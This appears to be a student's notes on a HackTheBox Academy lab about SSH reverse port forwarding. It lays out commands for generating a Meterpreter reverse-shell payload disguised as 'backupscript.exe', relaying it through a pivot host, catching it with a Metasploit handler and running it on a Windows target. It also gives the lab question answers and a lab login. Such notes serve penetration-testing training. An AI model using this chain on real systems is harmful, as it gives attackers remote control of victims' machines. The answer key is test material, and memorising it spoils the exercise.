# Remote/Reverse Port Forwarding with SSH

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1427](https://academy.hackthebox.com/module/158/section/1427) |

---

## 🔑 Key Commands

### Generate Payload with msfvenom
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=<pivot_host_internal_ip> \
  LPORT=8080 \
  -f exe -o backupscript.exe
```

### Upload Payload to Pivot Host
```bash
scp backupscript.exe ubuntu@<pivot_host>:~/
```

### SSH Reverse Port Forwarding
```bash
# Forward pivot port 8080 → attack host port 8000
ssh -R 8080:0.0.0.0:8000 ubuntu@<pivot_host> -vN
```

### Metasploit Handler
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run
```

### Transfer & Execute Payload on Windows Target
```bash
# From pivot host via Python HTTP server
cd ~
python3 -m http.server 8123

# On Windows target (RDP session)
# Browser → http://172.16.5.129:8123/backupscript.exe → run
```

---

## ❓ Questions

### Q1 — Which IP on Ubuntu pivot connects to Windows target?
**Answer:** `172.16.5.129`

```bash
ssh ubuntu@10.129.202.64   # pass: HTB_@cademy_stdnt!
ifconfig
# Look for IP in 172.16.5.0/23 range
```

### Q2 — What IP ensures handler listens on all interfaces?
**Answer:** `0.0.0.0`

```bash
msf6 exploit(multi/handler) > set lhost 0.0.0.0
# 0.0.0.0 = listen on ALL interfaces
```
